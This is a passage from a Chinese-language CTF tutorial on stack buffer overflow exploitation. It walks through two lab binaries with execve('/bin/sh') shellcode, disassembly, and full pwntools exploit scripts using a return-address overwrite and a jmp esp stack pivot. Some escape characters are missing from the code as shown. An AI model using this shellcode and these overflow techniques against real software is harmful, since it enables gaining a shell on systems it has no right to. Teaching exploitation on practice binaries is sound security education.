理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：
    # 23 bytes
    # https://www.exploit-db.com/exploits/36858/
    shellcode_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
它的汇编形式是
    # char *const argv[]
    xorl %esi, %esi
    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'
    movq $0x68732f2f6e69622f, %rbx
    # for 'x00'
    pushq %rsi
    pushq %rbx
    pushq %rsp
    # const char *filename
    popq %rdi
    # __NR_execve 59
    pushq $59
    popq %rax
    # char *const envp[]
    xorl %edx, %edx
    syscall
好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。
我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。
处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：
它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）
那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。
    from pwn import *
    code = ELF('./pwn5')
    # 23 bytes
    # https://www.exploit-db.com/exploits/36858/
    shellcode_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
    sh.recvuntil('[')
    buf_addr = sh.recvuntil(']', drop=True)
    buf_addr = int(buf_addr, 16)
    payload = 'b' * 24 + p64(buf_addr + 32) + shellcode_x64
    sh.sendline(payload)
    sh.interactive()
堆栈的布置图，以及地址的相对位置，以buf为起点。
## 第二题（控制esp进行精准打击）
接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？
[pwn6](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6)
继续前面的过程：
###  第一步：检测保护情况
发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。
###  第二步，判断漏洞函数，
如gets,scanf等
发现是fgets函数，仅仅读取50个字节的字符长度。
###  第三步，
计算目标变量的在堆栈中距离ebp的偏移。
方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。
###  第四步和第五步：
分析是否已经载入了可以利用的函数。发现并没有
    $ ROPgadget --binary stack_pivoting_1 --string '/bin/sh'
    Strings information
    ============================================================
字符串自然也是没有的。
我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！
那么怎么办呢？
既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。
这里，我先放图出来解释一下思路：
我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：
  1. 推算shellcode放置的地址
  2. 跳转到shellcode放置的位置
首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。
对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp
esp这个操作，来让程序流获得在栈上执行的先河。
    $ ROPgadget --binary stack_pivoting_1 --only 'jmp|ret' | grep 'esp'
    0x08048504 : jmp esp
发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。
在这里，我们直接可以选择让pwntools产生可执行的代码”sub esp 0x28; jmp
esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。
最后的EXP按照下面这样布置：
    from pwn import *
    sh = process('./pwn6')
    shellcode_x86 = "x31xc9xf7xe1x51x68x2fx2fx73"
    shellcode_x86 += "x68x68x2fx62x69x6ex89xe3xb0"
    shellcode_x86 += "x0bxcdx80"
    sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
    jmp_esp = 0x08048504
    payload = shellcode_x86 + (
        0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
    sh.sendline(payload)
    sh.interactive()
注意，这里我们又启用了另外一段代码：
它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：
    shellcode_x86 = "x31xc9”                  # xor    ecx, ecx
    shellcode_x86 += “xf7xe1”            # mul    ecx
    shellcode_x86 += “x51”            # push   ecx
    shellcode_x86 += "x68x2fx2fx73x68"  # push 0x68732f2f
    shellcode_x86 += "x68x2fx62x69x6e"  # push 0x6e69622f    
    shellcode_x86 += “x89xe3”            # mov    ebx, esp
    shellcode_x86 += “xb0x0b”            # mov    al, 0xb
    shellcode_x86 += "xcdx80"        # int    0x80
## 总结
最后，再次给大家留下练习题。
[pwn7](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7)
给大家一个小tips，32位和64位程序的调试，一般的处理方式是准备两个虚拟机。但是这样操作太麻烦了，而且pwntools在32位下面经常无法正常工作。怎么办呢？理论上64位ubuntu是可以运行32位程序的，但是需要相关的库函数安装。使用下面的命令安装就好（[参考](https://blog.csdn.net/kingroc/article/details/51143327)）：
    sudo dpkg --add-architecture i386
    sudo apt-get update
    sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
如果是比较老的版本，可以用下面的命令：
    sudo apt-get install ia32-libs
如果大家觉得好，欢迎大家来我的github主页follow:
[desword_github](https://github.com/desword),[desword](https://desword.github.io/)